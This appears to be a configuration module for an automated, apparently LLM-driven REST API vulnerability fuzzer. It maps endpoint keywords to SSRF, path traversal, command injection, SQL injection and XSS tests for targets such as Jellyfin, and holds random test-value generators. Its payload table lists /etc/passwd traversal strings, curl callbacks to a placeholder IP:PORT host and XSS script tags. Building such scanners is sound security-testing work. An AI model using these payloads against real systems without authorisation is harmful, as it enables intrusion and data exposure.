import os, numpy, random, string, subprocess, pkg_resources
from symspellpy import SymSpell
import numpy as np
import base64
import random
import string
import time
import json
import uuid
# load a dictionary (this one consists of 82,765 English words)
sym_spell = SymSpell(max_dictionary_edit_distance=2, prefix_length=7)
dictionary_path = pkg_resources.resource_filename(
    "symspellpy", "frequency_dictionary_en_82_765.txt"
)
# term_index: column of the term 
# count_index: column of the term's frequency
sym_spell.load_dictionary(dictionary_path, term_index=0, count_index=1)

def generate_email():
    username_length = random.randint(4, 10)
    username = ''.join(random.choices(string.ascii_lowercase, k=username_length))
    domain_length = random.randint(4, 10)
    domain = ''.join(random.choices(string.ascii_lowercase, k=domain_length))
    extension = random.choice(['com', 'net', 'org'])
    email = f"{username}@{domain}.{extension}"
    return email

def generate_password():
    chars = ''
    chars += string.ascii_uppercase
    chars += string.ascii_lowercase
    chars += string.digits
    chars += string.punctuation
    password = ''.join(random.choices(chars, k=14))
    return password

def get_sqlmap_path():
    sqlmap_path = ""
    p = subprocess.Popen(["pip", "show", "sqlmap"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, _ = p.communicate()
    if out:
        out = out.decode()
        location = out[out.find('Location:')+10:]
        sqlmap_path = location[:location.find(os.linesep)] + "{0}sqlmap{0}sqlmap.py".format(os.path.sep)
    return sqlmap_path
        
ApiTemplateList = []

ApiFuncList = ["proxy_api", "upload_api", "path_api", "command_api", "database_api", "display_api"]

# ApiPathKeywords = {
# "proxy_api" : ["host", "link", "proxy", "fetch", "redirect", "callback", "hook", "img", "image", "connect"],
# "upload_api" : ["upload", "import", "file", "pic", "image", "img", "content", "page", "avatar", "attach", "submit", "post"],
# "path_api" : ["download", "export", "fetch", "file", "path", "category"],
# "command_api" : ["set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose", "ping", "system", "ip", "nslookup"],
# "database_api" : ["sql", "database", "db", "query", "list", "search", "order", "select", "table", "column", "row"],
# "display_api" : ["name", "content", "edit", "desc", "title", "view", "html", "link", "display", "code", "text", "tab", "comment", "tag", "note"]
# }
# ApiParamKeywords = {
# "proxy_api" : ["url", "uri", "host", "endpoint", "path", "href", "link", "proxy", "client", "remote", "fetch", "dest", "redirect", "site", "callback", "hook", "img", "image", "access", "domain", "agent", "ping"],
# "upload_api" : ["upload", "file", "path", "category", "dir", "pic", "image", "img"],
# "path_api" : ["file", "path", "category"],
# "command_api" : ["set", "command", "cmd", "exec", "ping", "ip", "nslookup"],
# "database_api" : ["sql", "query", "id", "select", "field"],
# "display_api" : ["name", "content", "desc", "title", "view", "html", "code", "text", "tab", "comment", "tag", "note"]
# }

# ApiParamKeywords = {
#     "proxy_api": ["url", "uri", "host", "endpoint", "path", "href", "link", "proxy", "client", "remote", "fetch", "dest", "redirect", "site", "callback", "hook", "img", "image", "access", "domain", "agent", "ping", "preview"],
#     "upload_api": ["upload", "file", "path", "category", "dir", "pic", "image", "img", "qr"],
#     "path_api": ["file", "path", "category", "documents"],
#     "command_api": ["set", "command", "cmd", "exec", "ping", "ip", "nslookup", "health"],
#     "database_api": ["sql", "query", "id", "select", "field", "collections"],
#     "display_api": ["name", "content", "desc", "title", "view", "html", "code", "text", "tab", "comment", "tag", "note", "locale"]
# }

# ApiPathKeywords = {
#     "proxy_api": ["host", "link", "proxy", "fetch", "redirect", "callback", "hook", "img", "image", "connect", "preview"],
#     "upload_api": ["upload", "import", "file", "pic", "image", "img", "content", "page", "avatar", "attach", "submit", "post", "qr"],
#     "path_api": ["download", "export", "fetch", "file", "path", "category", "documents"],
#     "command_api": ["set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose", "ping", "system", "ip", "nslookup", "health"],
#     "database_api": ["sql", "database", "db", "query", "list", "search", "order", "select", "table", "column", "row", "collections"],
#     "display_api": ["name", "content", "edit", "desc", "title", "view", "html", "link", "display", "code", "text", "tab", "comment", "tag", "note", "locale"]
# }

# ApiParamKeywords = {
#     "proxy_api": ["host", "link", "proxy", "fetch", "redirect", "callback", "hook", "img", "image", "connect"],
#     "upload_api": ["upload", "import", "file", "pic", "image", "img", "content", "page", "avatar", "attach", "submit", "post"],
#     "path_api": [
#         "download", "export", "fetch", "file", "path", "category", "account", "sessions", "sessionid", "avatars",
#         "browsers", "code", "collectionid", "documentid", "functionid", "executions", "executionid", "tag", "tags", 
#         "tagid", "health", "queue", "certificates", "logs", "tasks", "storage", "local", "locale", "countries", "eu", 
#         "phones", "fileid", "preview", "teamid", "name", "membershipid", "userid", "prefs", "status", "verification"
#     ],
#     "command_api": ["set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose", "ping", "system", "ip", "nslookup"],
#     "database_api": [
#         "sql", "database", "db", "query", "list", "search", "order", "select", "table", "column", "row", "limit", "offset",
#         "orderType", "name", "collections", "orderField", "orderCast", "data", "parentDocument", "parentProperty", 
#         "parentPropertyType", "documents", "health", "files", "storage"
#     ],
#     "display_api": [
#         "name", "content", "edit", "desc", "title", "view", "html", "link", "display", "code", "text", "tab", "comment", 
#         "tag", "note", "email", "password", "oldPassword", "prefs", "url", "secret", "userId", "width", "height", "quality", 
#         "color", "background", "size", "margin", "download", "search", "limit", "offset", "orderType", "runtime", "schedule", 
#         "timeout", "vars", "data", "gravity", "borderWidth", "borderColor", "borderRadius", "opacity", "rotation", "output", 
#         "status", "emailVerification"
#     ]
# }

# ApiPathKeywords = {
#     "proxy_api": [
#         "url", "uri", "host", "endpoint", "path", "href", "link", "proxy", "client", "remote", "fetch", "dest", "redirect",
#         "site", "callback", "hook", "img", "image", "access", "domain", "agent", "ping"
#     ],
#     "upload_api": ["upload", "file", "path", "category", "dir", "pic", "image", "img"],
#     "path_api": [
#         "file", "path", "category", "account", "logs", "password", "prefs", "recovery", "sessions", "verification", "avatars",
#         "browsers", "code", "credit-cards", "favicon", "flags", "image", "initials", "qr", "database", "collections", 
#         "documents", "collectionid", "documentid", "functions", "functionid", "executions", "tag", "tags", "health", 
#         "anti-virus", "cache", "db", "queue", "certificates", "tasks", "usage", "webhooks", "storage", "local", "time", 
#         "locale", "continents", "countries", "eu", "phones", "currencies", "languages", "files", "download", "preview", 
#         "teams", "teamid", "memberships", "membershipid", "users", "userid", "status",
#     ],
#     "command_api": ["set", "command", "cmd", "exec", "ping", "ip", "nslookup"],
#     "database_api": ["sql", "query", "id", "select", "field", "database", "collections", "documents"],
#     "display_api": ["name", "content", "desc", "title", "view", "html", "code", "text", "tab", "comment", "tag", "note", "email", 
#                     "memberships", "status"]
# }
# ApiParamKeywords = {
#     "proxy_api": [
#         "host", "link", "proxy", "fetch", "redirect", "callback", "hook",
#         "img", "image", "connect"
#     ],
#     "upload_api": [
#         "upload", "import", "file", "pic", "image", "img", "content", "page",
#         "avatar", "attach", "submit", "post"
#     ],
#     "path_api": [
#         "download", "export", "fetch", "file", "path", "category", "name"
#     ],
#     "command_api": [
#         "set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose",
#         "ping", "system", "ip", "nslookup"
#     ],
#     "database_api": [
#         "sql", "database", "db", "query", "list", "search", "order",
#         "select", "table", "column", "row", "max", "skip", "q", "in"
#     ],
#     "display_api": [
#         "name", "content", "edit", "desc", "title", "view", "html", "link",
#         "display", "code", "text", "tab", "comment", "tag", "note"
#     ]
# }

# ApiPathKeywords = {
#     "proxy_api": [
#         "url", "uri", "host", "endpoint", "path", "href", "link", "proxy",
#         "client", "remote", "fetch", "dest", "redirect", "site", "callback",
#         "hook", "img", "image", "access", "domain", "agent", "ping"
#     ],
#     "upload_api": [
#         "upload", "file", "path", "category", "dir", "pic", "image", "img"
#     ],
#     "path_api": [
#         "file", "path", "category", "baskets", "name", "responses",
#         "requests", "{name}"
#     ],
#     "command_api": [
#         "set", "command", "cmd", "exec", "ping", "ip", "nslookup", "method"
#     ],
#     "database_api": [
#         "sql", "query", "id", "select", "field", "stats", "baskets"
#     ],
#     "display_api": [
#         "name", "content", "desc", "title", "view", "html", "code", "text",
#         "tab", "comment", "tag", "note"
#     ]
# }
# ApiParamKeywords = {
#     "proxy_api": ["host", "link", "proxy", "fetch", "redirect", "callback", "hook", "img", "image", "connect", "url"],
#     "upload_api": ["upload", "import", "file", "pic", "image", "img", "content", "page", "avatar", "attach", "submit", "post"],
#     "path_api": ["download", "export", "fetch", "file", "path", "category", "name"],
#     "command_api": ["set", "command", "cmd", "conf", "cfg", "rpc", "exec", "diagnose", "ping", "system", "ip", "nslookup", "oldPassword", "password", "email", "url", "passwordAgain", "secret", "userId", "name", "runtime", "schedule", "timeout", "vars", "executions", "data", "tag", "status", "emailVerification"],
#     "database_api": ["sql", "database", "db", "query", "list", "search", "order", "select", "table", "column", "row", "email", "password", "name", "userId", "limit", "offset", "orderType", "field", "type", "required", "minLength", "maxLength", "collectionid", "orderField", "orderCast", "data", "parentDocument", "parentProperty", "parentPropertyType", "documentid", "url", "prefs"],
#     "display_api": ["name", "content", "edit", "desc", "title", "view", "html", "link", "display", "code", "text", "tab", "comment", "tag", "note", "width", "height", "quality", "color", "background", "size", "margin", "download", "gravity", "borderWidth", "borderColor", "borderRadius", "opacity", "rotation", "output"]
# }
# ApiPathKeywords = {
#     "proxy_api": ["url", "uri", "host", "endpoint", "path", "href", "link", "proxy", "client", "remote", "fetch", "dest", "redirect", "site", "callback", "hook", "img", "image", "access", "domain", "agent", "ping"],
#     "upload_api": ["upload", "file", "path", "category", "dir", "pic", "image", "img", "files", "download"],
#     "path_api": ["file", "path", "category", "account", "password", "prefs", "recovery", "sessions", "sessionid", "verification", "avatars", "functions", "executions", "tag", "tags", "health", "cache", "queue", "certificates", "tasks", "storage", "local", "locale", "continents", "countries", "eu", "phones", "languages", "teams", "teamid", "memberships", "status", "users", "userid", "logs"],
#     "command_api": ["set", "command", "cmd", "exec", "ping", "ip", "nslookup", "recovery", "functions", "executions"],
#     "database_api": ["sql", "query", "id", "select", "field", "account", "logs", "sessions", "database", "collections", "collectionid", "documents", "functions", "db", "files", "teams", "users"],
#     "display_api": ["name", "content", "desc", "title", "view", "html", "code", "text", "tab", "comment", "tag", "note", "avatars", "browsers", "credit-cards", "favicon", "flags", "image", "initials", "qr", "usage", "locale", "currencies", "preview"]
# }
# 初始化全局变量
ApiParamKeywords = {}
ApiPathKeywords = {}
json_file = "jellyfin/api_extraction_output.json"

with open(json_file) as f:
    data = json.load(f)
ApiParamKeywords = data["ApiParamKeywords"]
ApiPathKeywords = data["ApiPathKeywords"]
APIFuncAndVulMapping = {
"proxy_api" : "ssrf",
"upload_api" : "unrestricted_upload",
"path_api" : "path_traversal",
"command_api" : "command_injection",
"database_api" : "sql_injection",
"display_api" : "xss"
}


ApiVulnerabilityPayloads = {
"proxy_api" : ["http://IP:PORT/ssrf{0}","https://IP:PORT/ssrf{0}"],
"upload_api" : [],
"path_api" : ["/etc/passwd", "../"*9 + "etc/passwd", "C:\\Windows\\win.ini", "..\\"*9 + "C:\\Windows\\win.ini"],
"command_api" : ["curl http://IP:PORT/command{0}", "curl https://IP:PORT/command{0}"],
"database_api" : ["sqlmap"],
"display_api" : ["<img src='http://IP:PORT/xss{0}'>", "<img src='https://IP:PORT/xss{0}'>", "<script>window.location='http://IP:PORT/xss{0}'</script>"]
}
def generate_uuid():
    return str(uuid.uuid4())

def generate_date(start_year=2000, end_year=2023):
    year = random.randint(start_year, end_year)
    month = random.randint(1, 12)
    day = random.randint(1, 28)  # Avoid issues with varying month lengths
    return f"{year}-{month:02d}-{day:02d}"

def generate_datetime(start_year=2000, end_year=2023):
    year = random.randint(start_year, end_year)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    hour = random.randint(0, 23)
    minute = random.randint(0, 59)
    second = random.randint(0, 59)
    return f"{year}-{month:02d}-{day:02d}T{hour:02d}:{minute:02d}:{second:02d}Z"

def generate_phone_number():
    return f"+1-{random.randint(200, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}"

def generate_ip_address():
    return f"{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def generate_currency():
    return f"${random.randint(1, 1000)}.{random.randint(0, 99):02d}"

def generate_boolean():
    return random.choice([True, False])

def generate_integer(min_value=0, max_value=100):
    return random.randint(min_value, max_value)

def generate_float(min_value=0.0, max_value=100.0, precision=2):
    return round(random.uniform(min_value, max_value), precision)

def generate_string(length=10):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def generate_url():
    domains = ["example.com", "test.com", "demo.com", "sample.org"]
    paths = ["home", "about", "contact", "products", "services"]
    return f"https://{random.choice(domains)}/{random.choice(paths)}"

def generate_json():
    return {
        "id": generate_integer(),
        "name": generate_string(),
        "active": generate_boolean(),
    }

def generate_array(size=5):
    return [generate_integer() for _ in range(size)]

# API Parameter Format Dictionary
ApiParamFormat = {
    "email": [generate_email() for _ in range(44)],  # Random email addresses
    "pass": [generate_password() for _ in range(44)],  # Random passwords
    "uuid": [generate_uuid() for _ in range(44)],  # Random UUIDs
    "date": [generate_date() for _ in range(44)],  # Random dates
    "datetime": [generate_datetime() for _ in range(44)],  # Random datetimes
    "phone_number": [generate_phone_number() for _ in range(44)],  # Random phone numbers
    "ip_address": [generate_ip_address() for _ in range(44)],  # Random IP addresses
    "currency": [generate_currency() for _ in range(44)],  # Random currency values
    "boolean": [generate_boolean() for _ in range(44)],  # Random boolean values
    "integer": [generate_integer() for _ in range(44)],  # Random integers
    "float": [generate_float() for _ in range(44)],  # Random floating-point numbers
    "string": [generate_string() for _ in range(44)],  # Random strings
    "url": [generate_url() for _ in range(44)],  # Random URLs
    "json": [generate_json() for _ in range(44)],  # Random JSON objects
    "array": [generate_array() for _ in range(44)],  # Random arrays
}

import numpy as np

RandomValueDict = {
    # Existing types
    "String": ["LLMTestString" + str(i) for i in range(44)],
    "Uuid": ["566048da-ed19-4cd3-8e0a-b7e0e1ec4d" + str(i) for i in range(10, 54)],
    "DateTime": [str(i) + "-04-04T20:20:39+00:00" for i in range(1994, 2038)],
    "Date": [str(i) + "-04-04" for i in range(1994, 2038)],
    "Number": [round(x, 2) for x in list(np.arange(4.40, 4.84, 0.01))],
    "Int": list(range(44)),
    "Bool": [True, False] * 22,
    "Object": (
        [{"LLM" + str(i): False} for i in range(11)] +
        [{"LLM" + str(i): i} for i in range(11, 22)] +
        [{"LLM" + str(i): "LLM" + str(i - 11)} for i in range(22, 33)] +
        [{"LLM" + str(i): [round(x, 2) for x in list(np.arange(4.40, 4.84, 0.01))][i]} for i in range(33, 44)]
    ),

    # New types added earlier
    "Float": [round(x, 3) for x in list(np.arange(1.234, 2.000, 0.01))],  # Floating-point numbers
    "Email": ["user" + str(i) + "@example.com" for i in range(10, 54)],  # Example email addresses
    "PhoneNumber": ["+1-800-555-0" + str(i) for i in range(10, 54)],  # Example phone numbers
    "IPAddress": ["192.168.1." + str(i) for i in range(1, 255)],  # Example IP addresses
    "Currency": [f"${round(x, 2)}" for x in list(np.arange(10.0, 50.0, 1.5))],  # Example currency values
    "Enum": ["OptionA", "OptionB", "OptionC", "OptionD"],  # Example Enum values
    "Null": [None] * 10,  # Null values for testing

    # Additional types
    "Url": ["https://example.com/page" + str(i) for i in range(10, 54)],  # Example URLs
    "Base64": [base64.b64encode(f"data{i}".encode()).decode() for i in range(44)],  # Base64 encoded data
    "ColorHex": ["#" + ''.join([f"{random.randint(0, 255):02X}" for _ in range(3)]) for _ in range(44)],  # Random hex colors
    "Latitude": [round(90 * (i / 44), 6) for i in range(-22, 22)],  # Latitude values
    "Longitude": [round(180 * (i / 44), 6) for i in range(-22, 22)],  # Longitude values
    "Timestamp": [int(time.time()) + i * 86400 for i in range(44)],  # Unix timestamps
    "Regex": [
        r"^\d{3}-\d{2}-\d{4}$",  # US SSN format
        r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}$",  # Email format
        r"^\+?[1-9]\d{1,14}$",  # International phone number format
        r"^([0-9]{1,3}\.){3}[0-9]{1,3}$",  # IPv4 address format
    ],
    "FilePath": ["/home/user/file_" + str(i) + ".txt" for i in range(44)],  # Example file paths
    "Json": [
        {"id": i, "name": "User" + str(i), "active": i % 2 == 0} for i in range(44)
    ],  # Example JSON objects
    "Html": [
        f"<div><h1>Title {i}</h1><p>Content {i}</p></div>" for i in range(44)
    ],  # Example HTML snippets
    "Xml": [
        f"<root><item id='{i}'><name>Item {i}</name></item></root>" for i in range(44)
    ],  # Example XML snippets
    "NestedObject": [
        {
            "id": i,
            "details": {
                "name": "User" + str(i),
                "address": {
                    "street": "Street " + str(i),
                    "city": "City " + str(i),
                },
                "preferences": {
                    "newsletter": i % 2 == 0,
                    "notifications": i % 3 == 0,
                },
            },
        }
        for i in range(44)
    ],  # Example nested objects
    "RandomString": [
        ''.join(random.choices(string.ascii_letters + string.digits, k=10)) for _ in range(44)
    ],  # Random alphanumeric strings
    "BooleanCombinations": [
        {"flag1": i % 2 == 0, "flag2": i % 3 == 0, "flag3": i % 5 == 0} for i in range(44)
    ],  # Boolean combinations
}

ProducerMethods = ["POST", "PUT", "GET", "PATCH"]

ProducerMethodsNoGet = ["POST", "PUT", "PATCH"]

ProducerMethodPriority = {"POST": 4, "PUT": 3, "GET": 2, "PATCH": 1, "HEAD": 0, "DELETE": 0, "OPTIONS": 0, "TRACE": 0, "CONNECT": 0}

ParamValuePriority = {"LLM_TEST": 7, "LLM_CONSUMER": 6, "LLM_PRODUCER": 6, "LLM_CUSTOM": 5, "LLM_SPECIFICATION": 4, "LLM_FORMAT": 3, "LLM_SUCCESS": 2, "LLM_RANDOM":1}

JellyfinBugUrls = ["/Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}", "/Audio/{itemId}/hls1/{playlistId}/{segmentId}.{container}", "/Videos/{itemId}/hls1/{playlistId}/{segmentId}.{container}", "/Audio/{itemId}/stream.{container}", "/Videos/{itemId}/{mediaSourceId}/Subtitles/{index}/Stream.{format}", "/Videos/{itemId}/{mediaSourceId}/Subtitles/{index}/{startPositionTicks}/Stream.{format}", "/LiveTv/LiveStreamFiles/{streamId}/stream.{container}", "/Videos/{itemId}/{stream}.{container}", ""]

MicrocksTrigger = {"/jobs": "/jobs/{id}/start"}

SQLMapPath = get_sqlmap_path()